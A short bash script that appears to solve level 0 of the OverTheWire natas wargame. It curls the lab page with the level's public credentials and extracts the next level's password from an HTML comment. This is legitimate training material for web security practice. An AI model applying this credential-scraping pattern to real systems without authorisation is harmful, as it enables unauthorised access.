#!/usr/bin/bash

curl -s -u natas0:natas0 http://natas0.natas.labs.overthewire.org/ | grep -Po '(?<=(natas1 is)).*(?= -->)'
